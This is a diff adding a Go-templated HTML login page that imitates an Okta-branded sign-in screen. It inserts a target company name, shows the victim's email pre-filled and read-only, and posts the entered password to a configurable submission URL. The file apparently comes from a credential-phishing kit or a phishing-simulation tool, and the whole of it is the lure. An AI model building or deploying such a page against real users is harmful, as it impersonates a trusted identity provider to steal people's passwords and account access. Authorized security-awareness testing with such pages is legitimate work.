@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign In</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,sans-serif;background-color:#f4f5f7;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.outer{text-align:center}
+.logo{margin-bottom:32px}
+.logo h1{font-size:28px;font-weight:700;color:#1662dd}
+.logo p{font-size:14px;color:#6e6e78;margin-top:4px}
+.login-box{background:#fff;padding:40px;width:400px;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.08);text-align:left}
+h2{font-size:20px;font-weight:500;color:#1d1d21;margin-bottom:24px}
+.form-group{margin-bottom:20px}
+.form-group label{display:block;font-size:14px;font-weight:500;color:#1d1d21;margin-bottom:6px}
+.form-group input{width:100%;padding:10px 12px;font-size:14px;border:1px solid #c7c7d1;border-radius:4px;outline:none;font-family:inherit;transition:border 0.2s}
+.form-group input:focus{border-color:#1662dd;box-shadow:0 0 0 1px #1662dd}
+.form-group input.prefilled{background:#f4f5f7;color:#6e6e78}
+.remember{display:flex;align-items:center;margin-bottom:24px;font-size:14px;color:#6e6e78}
+.remember input{margin-right:8px}
+.submit-btn{width:100%;padding:12px;background-color:#1662dd;color:#fff;border:none;font-size:16px;font-weight:500;border-radius:4px;cursor:pointer;font-family:inherit}
+.submit-btn:hover{background-color:#1456c0}
+.links{text-align:center;margin-top:20px}
+.links a{color:#1662dd;text-decoration:none;font-size:13px}
+.links a:hover{text-decoration:underline}
+.help-links{margin-top:20px;text-align:center;font-size:13px;color:#6e6e78}
+.help-links a{color:#6e6e78;text-decoration:none}
+.help-links a:hover{color:#1662dd}
+.footer{margin-top:24px;font-size:12px;color:#a7a7b3}
+</style>
+</head>
+<body>
+<div class="outer">
+<div class="logo">
+<h1>{{.Company}}</h1>
+<p>Powered by Okta</p>
+</div>
+
+<div class="login-box">
+<h2>Sign In</h2>
+
+<form method="POST" action="{{.SubmitURL}}">
+<div class="form-group">
+<label for="username">Username</label>
+<input type="text" id="username" name="email" value="{{.Email}}" class="prefilled" readonly>
+</div>
+
+<div class="form-group">
+<label for="password">Password</label>
+<input type="password" id="password" name="password" placeholder="Enter your password" required autofocus>
+</div>
+
+<div class="remember">
+<input type="checkbox" id="remember" checked>
+<label for="remember">Remember me</label>
+</div>
+
+<button type="submit" class="submit-btn">Sign In</button>
+</form>
+
+<div class="links">
+<a href="#">Need help signing in?</a>
+</div>
+</div>
+
+<div class="help-links">
+<a href="#">Help</a> &bull;
+<a href="#">Privacy Policy</a> &bull;
+<a href="#">Terms of Service</a>
+</div>
+<div class="footer">&copy; 2024 {{.Company}}. All rights reserved.</div>
+</div>
+</body>
+</html>
